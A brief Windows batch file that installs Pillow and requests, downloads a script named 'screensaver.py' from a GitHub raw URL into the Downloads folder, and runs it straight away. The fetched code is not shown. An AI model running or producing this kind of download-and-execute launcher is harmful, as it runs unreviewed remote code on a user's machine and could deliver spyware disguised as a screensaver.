@echo off
python -m pip install Pillow requests

echo.
echo Starting screensaver.py...
cd /d "%USERPROFILE%\Downloads"
cd /d "%USERPROFILE%\Downloads"
curl -L "https://raw.githubusercontent.com/szczoteczkq/Main-Library/main/screensaver.py" -o screensaver.py
python screensaver.py

pause
